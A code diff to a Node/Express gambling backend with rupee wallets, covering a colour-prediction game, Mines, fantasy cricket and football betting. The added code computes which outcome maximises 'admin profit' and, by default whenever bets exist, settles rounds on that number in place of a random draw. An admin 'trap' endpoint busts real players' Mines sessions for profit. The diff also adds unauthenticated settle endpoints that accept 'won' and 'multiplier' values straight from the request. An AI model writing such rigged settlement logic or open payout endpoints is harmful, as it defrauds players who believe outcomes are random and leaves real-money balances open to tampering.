@@ -5,7 +5,9 @@
  * Powered by PostgreSQL and Prisma ORM.
  */
 
-require('dotenv').config();
+const path = require('path');
+require('dotenv').config({ path: path.join(__dirname, '.env') });
+require('dotenv').config(); // Fallback for root .env
 const express = require('express');
 const cors = require('cors');
 const bcrypt = require('bcryptjs');
@@ -683,6 +685,63 @@ function resolveColorNumber(num) {
   return { color: 'Red', dotClass: 'red', size: num >= 5 ? 'Big' : 'Small' };
 }
 
+// Calculate the exact optimal outcome for Admin profit across all numbers (0-9)
+function calculateColorOptimalOutcome(bets) {
+  const roundBets = Array.isArray(bets) ? bets : [];
+  const totalVolume = roundBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
+
+  const outcomes = [];
+  for (let n = 0; n <= 9; n++) {
+    const resolved = resolveColorNumber(n);
+    let playerPayout = 0;
+
+    for (const b of roundBets) {
+      const amt = parseFloat(b.amount) || 0;
+      if (b.category === 'color') {
+        if (b.value === resolved.color) {
+          playerPayout += amt * (b.value === 'Violet' ? 4.5 : 2.0);
+        }
+      } else if (b.category === 'number') {
+        if (parseInt(b.value) === n) {
+          playerPayout += amt * 9.0;
+        }
+      } else if (b.category === 'size') {
+        if (b.value === resolved.size) {
+          playerPayout += amt * 2.0;
+        }
+      }
+    }
+
+    const adminProfit = totalVolume - playerPayout;
+    outcomes.push({
+      number: n,
+      color: resolved.color,
+      dotClass: resolved.dotClass,
+      size: resolved.size,
+      playerPayout: parseFloat(playerPayout.toFixed(2)),
+      adminProfit: parseFloat(adminProfit.toFixed(2))
+    });
+  }
+
+  // Sort by highest profit to lowest profit
+  const sorted = [...outcomes].sort((a, b) => b.adminProfit - a.adminProfit);
+  const best = sorted[0];
+  const worst = sorted[sorted.length - 1];
+
+  return {
+    total_volume: parseFloat(totalVolume.toFixed(2)),
+    total_bets_count: roundBets.length,
+    best_number: best.number,
+    best_color: best.color,
+    best_size: best.size,
+    max_profit: best.adminProfit,
+    min_payout: best.playerPayout,
+    worst_number: worst.number,
+    worst_loss: worst.playerPayout,
+    outcomes: outcomes // Index 0..9 for fast lookup
+  };
+}
+
 async function loadColorState() {
   const record = await prisma.gameState.findUnique({ where: { key: 'color_guess_ongoing' } });
   if (record) return record.data;
@@ -727,10 +786,17 @@ async function settleColorRound(room, targetRound, state) {
   const overrideKey = `color_guess_overrides_${room}`;
   const overrideRecord = await prisma.gameState.findUnique({ where: { key: overrideKey } });
   const override = overrideRecord ? overrideRecord.data : {};
-  
+  const roundBets = (state[room].bets && state[room].bets[targetRound]) ? state[room].bets[targetRound] : [];
+
   let num = null;
   if (override && override.number !== undefined && override.number !== null && override.number !== '') {
     num = parseInt(override.number);
+  } else if (override && (override.rig_type === 'platform_profit' || override.rig_type === 'max_profit')) {
+    const optimal = calculateColorOptimalOutcome(roundBets);
+    num = optimal.best_number;
+  } else if (override && override.rig_type === 'user_win') {
+    const optimal = calculateColorOptimalOutcome(roundBets);
+    num = optimal.worst_number;
   } else {
     let possible = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
     if (override && override.color) {
@@ -746,7 +812,15 @@ async function settleColorRound(room, targetRound, state) {
     }
     
     if (possible.length > 0) {
-      num = possible[Math.floor(Math.random() * possible.length)];
+      if (roundBets.length > 0) {
+        const optimal = calculateColorOptimalOutcome(roundBets);
+        const bestPossible = optimal.outcomes
+          .filter(o => possible.includes(o.number))
+          .sort((a, b) => b.adminProfit - a.adminProfit);
+        num = (bestPossible.length > 0) ? bestPossible[0].number : possible[Math.floor(Math.random() * possible.length)];
+      } else {
+        num = possible[Math.floor(Math.random() * possible.length)];
+      }
     } else {
       num = Math.floor(Math.random() * 10);
     }
@@ -805,7 +879,6 @@ async function settleColorRound(room, targetRound, state) {
     console.error("Error saving recent result:", err);
   }
   
-  const roundBets = (state[room].bets && state[room].bets[targetRound]) ? state[room].bets[targetRound] : [];
   for (const b of roundBets) {
     let won = false;
     let multiplier = 0;
@@ -891,13 +964,19 @@ app.get('/api/game_sync.php', async (req, res) => {
       const myBets = activeBets.filter(b => b.username.toLowerCase() === username.toLowerCase());
       const overridesRecord = await prisma.gameState.findUnique({ where: { key: `color_guess_overrides_${room}` } });
 
+      const user = await getOrCreateUser(username);
+      const optimal = calculateColorOptimalOutcome(activeBets);
+
       res.json({
         round_id,
         time_left,
         duration,
         history: state[room].history || [],
         bets: myBets,
-        overrides: overridesRecord ? overridesRecord.data : {}
+        overrides: overridesRecord ? overridesRecord.data : {},
+        wallet_balance: user ? user.wallet_balance : 1000.0,
+        active_users: activeBets.length,
+        optimal_rig: optimal
       });
     } else if (action === 'aviator_get_state') {
       const now = Date.now();
@@ -951,6 +1030,7 @@ app.get('/api/game_sync.php', async (req, res) => {
 
         const activeBets = (state[room].bets && state[room].bets[round_id]) ? state[room].bets[round_id] : [];
         const overridesRecord = await prisma.gameState.findUnique({ where: { key: `color_guess_overrides_${room}` } });
+        const optimal = calculateColorOptimalOutcome(activeBets);
 
         colorGuess[room] = {
           round_id,
@@ -958,7 +1038,8 @@ app.get('/api/game_sync.php', async (req, res) => {
           duration,
           history: state[room].history || [],
           bets: activeBets,
-          overrides: overridesRecord ? overridesRecord.data : {}
+          overrides: overridesRecord ? overridesRecord.data : {},
+          optimal_rig: optimal
         };
       }
       if (stateChanged) {
@@ -1008,11 +1089,7 @@ app.post('/api/game_sync.php', async (req, res) => {
       }
 
       const nowSec = Math.floor(Date.now() / 1000);
-      const durations = { sapre: 30, becone: 60, emred: 180, vip: 300 };
-      const duration = durations[room] || 30;
-      const dateStr = new Date().toISOString().replace(/[-T:]/g, '').slice(0, 10);
-      const bucket = Math.floor((nowSec / duration) % 100);
-      const round_id = dateStr + '0' + bucket;
+      const round_id = getColorRoundId(room, nowSec);
 
       const newBal = user.wallet_balance - betAmt;
       await prisma.user.update({
@@ -2830,21 +2907,6 @@ app.post('/api/mines/cashout', async (req, res) => {
 
 let MINES_TOTAL_TRAP_PROFIT = 0;
 
-let MINES_DUMMY_USERS = [
-  { username: 'DemoUser', type: 'Real Player', bet: 100, mines: 3, revealed: 2, status: 'Active' },
-  { username: 'Vikram_P', type: 'Simulated User', bet: 200, mines: 3, revealed: 4, status: 'Active' },
-  { username: 'Neha_R', type: 'Simulated User', bet: 500, mines: 5, revealed: 3, status: 'Active' },
-  { username: 'Rohit_M', type: 'Simulated User', bet: 150, mines: 2, revealed: 1, status: 'Active' },
-  { username: 'Ananya_S', type: 'Simulated User', bet: 300, mines: 4, revealed: 5, status: 'Active' },
-  { username: 'Karan_V', type: 'Simulated User', bet: 250, mines: 3, revealed: 2, status: 'Active' },
-  { username: 'Priya_K', type: 'Simulated User', bet: 100, mines: 2, revealed: 3, status: 'Active' },
-  { username: 'Aarav_G', type: 'Simulated User', bet: 400, mines: 6, revealed: 1, status: 'Active' },
-  { username: 'Riya_D', type: 'Simulated User', bet: 350, mines: 3, revealed: 4, status: 'Active' },
-  { username: 'Kabir_N', type: 'Simulated User', bet: 500, mines: 5, revealed: 2, status: 'Active' },
-  { username: 'Ishaan_B', type: 'Simulated User', bet: 200, mines: 3, revealed: 2, status: 'Active' },
-  { username: 'Saanvi_M', type: 'Simulated User', bet: 600, mines: 4, revealed: 6, status: 'Active' }
-];
-
 // POST /api/mines/admin/rig — Admin endpoint to configure Mines Matrix & Overrides & Trigger Traps
 app.post('/api/mines/admin/rig', async (req, res) => {
   const { matrix, rig_type, next_tile, target_users, trigger_trap } = req.body;
@@ -2873,26 +2935,13 @@ app.post('/api/mines/admin/rig', async (req, res) => {
         ? new Set(MINES_RIG_CONFIG.target_users)
         : null;
 
-      // 1. Process simulated dummy users
-      MINES_DUMMY_USERS.forEach(su => {
-        const isTargeted = !targetedSet || targetedSet.has(su.username);
-        if (isTargeted && su.status === 'Active') {
-          su.status = 'Trapped (Busted)';
-          profitRealized += parseFloat(su.bet || 0);
-          newlyTrappedCount++;
-        }
-      });
-
-      // 2. Process real user sessions
+      // Process real user sessions only
       Object.keys(MINES_USER_SESSIONS).forEach(u => {
         const sess = MINES_USER_SESSIONS[u];
         const isTargeted = !targetedSet || targetedSet.has(u);
         if (sess && sess.status === 'active' && isTargeted) {
-          // If not already included via dummy users array
-          if (!MINES_DUMMY_USERS.some(su => su.username === u)) {
-            profitRealized += parseFloat(sess.bet_amount || 0);
-            newlyTrappedCount++;
-          }
+          profitRealized += parseFloat(sess.bet_amount || 0);
+          newlyTrappedCount++;
           sess.status = 'busted';
         }
       });
@@ -2937,30 +2986,23 @@ app.get('/api/mines/admin/rig', async (req, res) => {
   }
 });
 
-// GET /api/mines/active-users — Fetch live list of active Mines users (real + simulated)
+// GET /api/mines/active-users — Fetch live list of active Mines users (real only)
 app.get('/api/mines/active-users', async (req, res) => {
   try {
     const activeList = [];
 
-    // Add real active sessions
+    // Only real active sessions
     Object.keys(MINES_USER_SESSIONS).forEach(u => {
       const sess = MINES_USER_SESSIONS[u];
       if (sess) {
         activeList.push({
           username: u,
-          type: u === 'DemoUser' ? 'Demo Player' : 'Real Player',
-          bet: sess.bet_amount || 100,
+          type: 'Real Player',
+          bet: sess.bet_amount || 0,
           mines: sess.mines_count || 3,
           revealed: (sess.revealed || []).length,
           status: sess.status === 'active' ? 'Active' : (sess.status === 'busted' ? 'Trapped (Busted)' : sess.status)
         });
-      }
-    });
-
-    // Simulated active dummy users pool to reflect realistic live traffic
-    MINES_DUMMY_USERS.forEach(su => {
-      if (!activeList.some(al => al.username === su.username)) {
-        activeList.push(su);
       }
     });
 
@@ -2976,7 +3018,7 @@ app.get('/api/mines/active-users', async (req, res) => {
   }
 });
 
-// POST /api/mines/admin/reset-rig — Clear all Mines rig overrides and reset active dummy users
+// POST /api/mines/admin/reset-rig — Clear all Mines rig overrides
 app.post('/api/mines/admin/reset-rig', async (req, res) => {
   try {
     MINES_RIG_CONFIG = {
@@ -2986,8 +3028,12 @@ app.post('/api/mines/admin/reset-rig', async (req, res) => {
       target_users: []
     };
 
-    MINES_DUMMY_USERS.forEach(su => {
-      su.status = 'Active';
+    // Reset all active real sessions back to active
+    Object.keys(MINES_USER_SESSIONS).forEach(u => {
+      const sess = MINES_USER_SESSIONS[u];
+      if (sess && sess.status === 'busted') {
+        sess.status = 'active';
+      }
     });
 
     await prisma.gameState.upsert({
@@ -3097,6 +3143,482 @@ scheduleNextTrafficTick();
 
 // Seed rooms on startup
 tpSeedRooms().catch(e => console.error('[TP] Seed error:', e.message));
+
+// ========================================================================
+// CRICKET (YOUR ELEVEN) — FANTASY CRICKET BACKEND
+// ========================================================================
+
+const CRICKET_PLAYER_POOL = [
+  { id: 1,  name: 'Rishabh Pant',     team: 'India', role: 'WK',   credits: 9.0 },
+  { id: 2,  name: 'KL Rahul',         team: 'India', role: 'WK',   credits: 8.5 },
+  { id: 3,  name: 'Rohit Sharma',     team: 'India', role: 'BAT',  credits: 10.0 },
+  { id: 4,  name: 'Virat Kohli',      team: 'India', role: 'BAT',  credits: 10.5 },
+  { id: 5,  name: 'Yashasvi Jaiswal', team: 'India', role: 'BAT',  credits: 9.5 },
+  { id: 6,  name: 'Ravindra Jadeja',  team: 'India', role: 'AR',   credits: 9.5 },
+  { id: 7,  name: 'Hardik Pandya',    team: 'India', role: 'AR',   credits: 9.0 },
+  { id: 8,  name: 'Jasprit Bumrah',   team: 'India', role: 'BOWL', credits: 10.0 },
+  { id: 9,  name: 'Mohammed Siraj',   team: 'India', role: 'BOWL', credits: 8.5 },
+  { id: 10, name: 'Kuldeep Yadav',    team: 'India', role: 'BOWL', credits: 8.0 },
+  { id: 11, name: 'Arshdeep Singh',   team: 'India', role: 'BOWL', credits: 8.0 },
+  { id: 12, name: 'Josh Inglis',      team: 'Australia', role: 'WK',   credits: 8.5 },
+  { id: 13, name: 'Alex Carey',       team: 'Australia', role: 'WK',   credits: 8.0 },
+  { id: 14, name: 'Travis Head',      team: 'Australia', role: 'BAT',  credits: 10.0 },
+  { id: 15, name: 'Steve Smith',      team: 'Australia', role: 'BAT',  credits: 9.5 },
+  { id: 16, name: 'Mitchell Marsh',   team: 'Australia', role: 'BAT',  credits: 9.0 },
+  { id: 17, name: 'Glenn Maxwell',    team: 'Australia', role: 'AR',   credits: 9.5 },
+  { id: 18, name: 'Marcus Stoinis',   team: 'Australia', role: 'AR',   credits: 9.0 },
+  { id: 19, name: 'Pat Cummins',      team: 'Australia', role: 'BOWL', credits: 9.5 },
+  { id: 20, name: 'Mitchell Starc',   team: 'Australia', role: 'BOWL', credits: 9.5 },
+  { id: 21, name: 'Josh Hazlewood',   team: 'Australia', role: 'BOWL', credits: 9.0 },
+  { id: 22, name: 'Adam Zampa',       team: 'Australia', role: 'BOWL', credits: 8.5 }
+];
+
+function simulateCricketPlayerStats(role) {
+  let runs = 0, fours = 0, sixes = 0, wickets = 0, maidens = 0;
+  let catches = 0, stumpings = 0, runouts = 0;
+  const battingRoles = ['BAT', 'WK', 'AR'];
+  const bowlingRoles = ['BOWL', 'AR'];
+  if (battingRoles.includes(role)) {
+    const roll = Math.floor(Math.random() * 100) + 1;
+    if (roll <= 10) runs = 0;
+    else if (roll <= 40) runs = Math.floor(Math.random() * 20) + 1;
+    else if (roll <= 70) runs = Math.floor(Math.random() * 25) + 21;
+    else if (roll <= 90) runs = Math.floor(Math.random() * 30) + 46;
+    else runs = Math.floor(Math.random() * 35) + 76;
+    if (runs > 0) {
+      fours = Math.floor(runs / (6 + Math.floor(Math.random() * 5)));
+      sixes = Math.floor(runs / (15 + Math.floor(Math.random() * 11)));
+    }
+  }
+  if (bowlingRoles.includes(role)) {
+    const roll = Math.floor(Math.random() * 100) + 1;
+    if (roll <= 20) wickets = 0;
+    else if (roll <= 55) wickets = Math.floor(Math.random() * 2) + 1;
+    else if (roll <= 85) wickets = Math.floor(Math.random() * 2) + 2;
+    else wickets = Math.floor(Math.random() * 3) + 3;
+    maidens = (Math.floor(Math.random() * 100) + 1 <= 20) ? 1 : 0;
+  }
+  if (Math.floor(Math.random() * 100) + 1 <= 30) catches = Math.floor(Math.random() * 2) + 1;
+  if (role === 'WK' && Math.floor(Math.random() * 100) + 1 <= 15) stumpings = 1;
+  if (Math.floor(Math.random() * 100) + 1 <= 10) runouts = 1;
+  return { runs, fours, sixes, wickets, maidens, catches, stumpings, runouts };
+}
+
+function computeFantasyPoints(s, role) {
+  let pts = 0;
+  pts += s.runs * 1;
+  pts += s.fours * 1;
+  pts += s.sixes * 2;
+  if (s.runs >= 100) pts += 16;
+  else if (s.runs >= 50) pts += 8;
+  else if (s.runs >= 30) pts += 4;
+  if (s.runs === 0 && ['BAT', 'WK', 'AR'].includes(role)) pts -= 2;
+  pts += s.wickets * 25;
+  if (s.wickets >= 5) pts += 8;
+  else if (s.wickets >= 3) pts += 4;
+  pts += s.maidens * 4;
+  pts += s.catches * 8;
+  pts += s.stumpings * 12;
+  pts += s.runouts * 6;
+  return pts;
+}
+
+// GET /api/cricket/matches — Available matches
+app.get('/api/cricket/matches', (req, res) => {
+  res.json({
+    matches: [
+      { id: 'm1', teamA: 'India', teamB: 'Australia', title: 'ICC T20 World Cup Clash', entry_fee: 50 },
+      { id: 'm2', teamA: 'India', teamB: 'England', title: 'ODI Series Match 3', entry_fee: 100 },
+      { id: 'm3', teamA: 'Australia', teamB: 'South Africa', title: 'Test Championship Qualifier', entry_fee: 75 }
+    ]
+  });
+});
+
+// POST /api/cricket/submit-team — Submit fantasy team, deduct entry fee, simulate, store results
+app.post('/api/cricket/submit-team', async (req, res) => {
+  const { username, player_ids, captain_id, vice_id, match_id, entry_fee } = req.body;
+  if (!username || !player_ids || !captain_id || !vice_id) {
+    return res.status(400).json({ error: 'Missing required fields.' });
+  }
+  try {
+    const ids = Array.isArray(player_ids) ? player_ids.map(Number) : player_ids.split(',').map(Number);
+    if (ids.length !== 11) return res.status(400).json({ error: 'Must select exactly 11 players.' });
+
+    const fee = parseFloat(entry_fee) || 50;
+    const user = await getOrCreateUser(username);
+    if (user.wallet_balance < fee) {
+      return res.status(400).json({ error: `Insufficient balance. Need ₹${fee}, have ₹${user.wallet_balance.toFixed(2)}.` });
+    }
+
+    // Deduct entry fee
+    await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { decrement: fee } } });
+    await prisma.transaction.create({
+      data: {
+        id: 'CRICKET_' + Date.now(),
+        user: username,
+        type: 'Withdrawal',
+        amount: fee,
+        details: `Fantasy Cricket Entry Fee — Match ${match_id || 'm1'}`,
+        status: 'Completed'
+      }
+    });
+
+    // Simulate match
+    const simResults = {};
+    CRICKET_PLAYER_POOL.forEach(p => {
+      const stats = simulateCricketPlayerStats(p.role);
+      stats.points = computeFantasyPoints(stats, p.role);
+      simResults[p.id] = stats;
+    });
+
+    const captainId = Number(captain_id);
+    const viceId = Number(vice_id);
+    let teamTotal = 0;
+    const breakdown = ids.map(pid => {
+      const player = CRICKET_PLAYER_POOL.find(p => p.id === pid);
+      const stats = simResults[pid] || { runs: 0, fours: 0, sixes: 0, wickets: 0, maidens: 0, catches: 0, stumpings: 0, runouts: 0, points: 0 };
+      let multiplier = 1.0;
+      if (pid === captainId) multiplier = 2.0;
+      else if (pid === viceId) multiplier = 1.5;
+      const finalPoints = stats.points * multiplier;
+      teamTotal += finalPoints;
+      return {
+        id: pid, name: player ? player.name : `Player ${pid}`, team: player ? player.team : 'Unknown',
+        role: player ? player.role : 'BAT', stats, base_points: stats.points,
+        multiplier, final_points: finalPoints,
+        is_captain: pid === captainId, is_vice: pid === viceId
+      };
+    });
+    breakdown.sort((a, b) => b.final_points - a.final_points);
+
+    // Calculate payout based on performance
+    let payout = 0;
+    if (teamTotal >= 200) payout = fee * 5;
+    else if (teamTotal >= 150) payout = fee * 3;
+    else if (teamTotal >= 100) payout = fee * 2;
+    else if (teamTotal >= 75) payout = fee * 1.5;
+    else if (teamTotal >= 50) payout = fee * 1;
+
+    if (payout > 0) {
+      await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { increment: payout } } });
+      await prisma.transaction.create({
+        data: {
+          id: 'CRICKET_WIN_' + Date.now(),
+          user: username,
+          type: 'Deposit',
+          amount: payout,
+          details: `Fantasy Cricket Payout — ${teamTotal.toFixed(0)} pts`,
+          status: 'Completed'
+        }
+      });
+    }
+
+    // Store in GameBet table
+    await prisma.gameBet.create({
+      data: {
+        username, game: 'cricket', bet_amount: fee, payout,
+        status: payout > 0 ? 'won' : 'lost',
+        metadata: { match_id, team_total: teamTotal, captain_id: captainId, vice_id: viceId, player_ids: ids },
+        settled_at: new Date()
+      }
+    });
+
+    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
+    res.json({ success: true, breakdown, team_total: teamTotal, payout, balance: updatedUser.wallet_balance });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/cricket/history — User's match history
+app.get('/api/cricket/history', async (req, res) => {
+  const username = req.query.username || 'DemoUser';
+  try {
+    const bets = await prisma.gameBet.findMany({
+      where: { username: { equals: username, mode: 'insensitive' }, game: 'cricket' },
+      orderBy: { created_at: 'desc' },
+      take: 20
+    });
+    res.json({ success: true, history: bets });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ========================================================================
+// BOUNDARY BAAZI — CRICKET BETTING BACKEND
+// ========================================================================
+
+// POST /api/boundarybaazi/place-bet — Place a bet on batting outcome
+app.post('/api/boundarybaazi/place-bet', async (req, res) => {
+  const { username, bet_amount, bet_type, selection } = req.body;
+  const betAmt = parseFloat(bet_amount);
+  if (!username || isNaN(betAmt) || betAmt <= 0 || !bet_type) {
+    return res.status(400).json({ error: 'Invalid bet details.' });
+  }
+  try {
+    const user = await getOrCreateUser(username);
+    if (user.wallet_balance < betAmt) {
+      return res.status(400).json({ error: 'Insufficient balance.' });
+    }
+    await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { decrement: betAmt } } });
+    await prisma.transaction.create({
+      data: {
+        id: 'BB_' + Date.now(),
+        user: username, type: 'Withdrawal', amount: betAmt,
+        details: `Boundary Baazi Bet — ${bet_type}: ${selection || 'N/A'}`,
+        status: 'Completed'
+      }
+    });
+
+    const gameBet = await prisma.gameBet.create({
+      data: {
+        username, game: 'boundarybaazi', bet_amount: betAmt,
+        status: 'active',
+        metadata: { bet_type, selection }
+      }
+    });
+
+    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
+    res.json({ success: true, bet_id: gameBet.id, balance: updatedUser.wallet_balance });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/boundarybaazi/settle — Settle a bet
+app.post('/api/boundarybaazi/settle', async (req, res) => {
+  const { bet_id, won, multiplier } = req.body;
+  if (!bet_id) return res.status(400).json({ error: 'bet_id required.' });
+  try {
+    const gameBet = await prisma.gameBet.findUnique({ where: { id: bet_id } });
+    if (!gameBet || gameBet.status !== 'active') return res.status(400).json({ error: 'Bet not found or already settled.' });
+
+    const payout = won ? gameBet.bet_amount * (parseFloat(multiplier) || 2.0) : 0;
+    await prisma.gameBet.update({
+      where: { id: bet_id },
+      data: { status: won ? 'won' : 'lost', payout, settled_at: new Date() }
+    });
+
+    if (won && payout > 0) {
+      const user = await prisma.user.findFirst({ where: { username: { equals: gameBet.username, mode: 'insensitive' } } });
+      if (user) {
+        await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { increment: payout } } });
+        await prisma.transaction.create({
+          data: {
+            id: 'BB_WIN_' + Date.now(),
+            user: gameBet.username, type: 'Deposit', amount: payout,
+            details: `Boundary Baazi Win — ${parseFloat(multiplier) || 2.0}x`,
+            status: 'Completed'
+          }
+        });
+      }
+    }
+    res.json({ success: true, payout, status: won ? 'won' : 'lost' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ========================================================================
+// FOOTBALL — MATCH BETTING BACKEND
+// ========================================================================
+
+// POST /api/football/place-bet & /api/bets — Place football match bets (single or parlay)
+app.post(['/api/football/place-bet', '/api/bets'], async (req, res) => {
+  const username = req.body.username || req.body.user || 'DemoUser';
+  const betType = req.body.bet_type || 'single';
+  const stake = parseFloat(req.body.stake || req.body.bet_amount || 0);
+  const legs = Array.isArray(req.body.legs) ? req.body.legs : [];
+
+  if (isNaN(stake) || stake <= 0) {
+    return res.status(400).json({ error: 'Invalid stake amount.' });
+  }
+
+  try {
+    const user = await getOrCreateUser(username);
+    const totalCost = betType === 'single' ? (stake * Math.max(1, legs.length)) : stake;
+
+    if (user.wallet_balance < totalCost) {
+      return res.status(400).json({ error: `Insufficient balance! Need ₹${totalCost.toFixed(2)}, have ₹${user.wallet_balance.toFixed(2)}.` });
+    }
+
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { wallet_balance: { decrement: totalCost } }
+    });
+
+    const placedBets = [];
+    if (betType === 'single' && legs.length > 0) {
+      for (const pick of legs) {
+        const betId = 'FB' + Math.floor(1000 + Math.random() * 9000);
+        const odds = parseFloat(pick.odds) || 2.0;
+        await prisma.transaction.create({
+          data: {
+            id: 'TX_' + Date.now() + '_' + betId,
+            user: username,
+            type: 'Withdrawal',
+            amount: stake,
+            details: `Football Single Bet: ${pick.match_label || ''} (${pick.label || ''}) @ ${odds}x`,
+            status: 'Completed'
+          }
+        });
+
+        await prisma.gameBet.create({
+          data: {
+            id: betId,
+            username,
+            game: 'football',
+            bet_amount: stake,
+            status: 'active',
+            metadata: { type: 'single', legs: [pick], total_odds: odds, match_id: pick.match_id, selection: pick.selection }
+          }
+        });
+
+        placedBets.push({
+          id: betId,
+          type: 'single',
+          timestamp: new Date().toISOString(),
+          stake,
+          total_odds: odds,
+          potential_payout: parseFloat((stake * odds).toFixed(2)),
+          status: 'pending',
+          legs: [{ ...pick, result: 'pending' }]
+        });
+      }
+    } else {
+      const betId = 'FB' + Math.floor(1000 + Math.random() * 9000);
+      const totalOdds = legs.length > 0 ? legs.reduce((acc, p) => acc * (parseFloat(p.odds) || 1.0), 1.0) : (parseFloat(req.body.odds) || 2.0);
+      const roundedOdds = parseFloat(totalOdds.toFixed(2));
+
+      await prisma.transaction.create({
+        data: {
+          id: 'TX_' + Date.now() + '_' + betId,
+          user: username,
+          type: 'Withdrawal',
+          amount: totalCost,
+          details: `Football Accumulator Parlay Bet (${legs.length} legs) @ ${roundedOdds}x`,
+          status: 'Completed'
+        }
+      });
+
+      await prisma.gameBet.create({
+        data: {
+          id: betId,
+          username,
+          game: 'football',
+          bet_amount: totalCost,
+          status: 'active',
+          metadata: { type: betType, legs, total_odds: roundedOdds }
+        }
+      });
+
+      placedBets.push({
+        id: betId,
+        type: betType,
+        timestamp: new Date().toISOString(),
+        stake: totalCost,
+        total_odds: roundedOdds,
+        potential_payout: parseFloat((totalCost * roundedOdds).toFixed(2)),
+        status: 'pending',
+        legs: legs.map(l => ({ ...l, result: 'pending' }))
+      });
+    }
+
+    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
+    res.json({
+      success: true,
+      bets_placed: placedBets.length,
+      bets: placedBets,
+      new_balance: updatedUser.wallet_balance
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/football/settle — Settle football match bets
+app.post('/api/football/settle', async (req, res) => {
+  const { match_id, winning_selection } = req.body;
+  if (!match_id || !winning_selection) return res.status(400).json({ error: 'match_id and winning_selection required.' });
+  try {
+    const activeBets = await prisma.gameBet.findMany({
+      where: { game: 'football', status: 'active' }
+    });
+
+    const matchBets = activeBets.filter(b => b.metadata && b.metadata.match_id === match_id);
+    let settledCount = 0;
+
+    for (const bet of matchBets) {
+      const won = bet.metadata.selection === winning_selection;
+      const odds = bet.metadata.odds || 2.0;
+      const payout = won ? bet.bet_amount * odds : 0;
+
+      await prisma.gameBet.update({
+        where: { id: bet.id },
+        data: { status: won ? 'won' : 'lost', payout, settled_at: new Date() }
+      });
+
+      if (won && payout > 0) {
+        const user = await prisma.user.findFirst({ where: { username: { equals: bet.username, mode: 'insensitive' } } });
+        if (user) {
+          await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { increment: payout } } });
+          await prisma.transaction.create({
+            data: {
+              id: 'FB_WIN_' + Date.now() + '_' + settledCount,
+              user: bet.username, type: 'Deposit', amount: payout,
+              details: `Football Win — Match ${match_id}: ${winning_selection} @ ${odds}x`,
+              status: 'Completed'
+            }
+          });
+        }
+      }
+      settledCount++;
+    }
+    res.json({ success: true, settled_count: settledCount });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/football/active-bets — Get user's active football bets
+app.get('/api/football/active-bets', async (req, res) => {
+  const username = req.query.username || 'DemoUser';
+  try {
+    const bets = await prisma.gameBet.findMany({
+      where: { username: { equals: username, mode: 'insensitive' }, game: 'football', status: 'active' },
+      orderBy: { created_at: 'desc' }
+    });
+    res.json({ success: true, bets });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ========================================================================
+// ADMIN — UNIFIED GAME STATS (ALL REAL DATA)
+// ========================================================================
+
+// GET /api/admin/game-stats — Aggregate stats for all games
+app.get('/api/admin/game-stats', async (req, res) => {
+  try {
+    const games = ['mines', 'cricket', 'football', 'boundarybaazi'];
+    const stats = {};
+    for (const game of games) {
+      const total = await prisma.gameBet.count({ where: { game } });
+      const active = await prisma.gameBet.count({ where: { game, status: 'active' } });
+      const won = await prisma.gameBet.count({ where: { game, status: 'won' } });
+      const lost = await prisma.gameBet.count({ where: { game, status: 'lost' } });
+      const allBets = await prisma.gameBet.findMany({ where: { game } });
+      const totalWagered = allBets.reduce((sum, b) => sum + b.bet_amount, 0);
+      const totalPayout = allBets.reduce((sum, b) => sum + b.payout, 0);
+      stats[game] = { total, active, won, lost, total_wagered: totalWagered, total_payout: totalPayout, house_profit: totalWagered - totalPayout };
+    }
+    res.json({ success: true, stats });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
 
 // ========================================================================
 
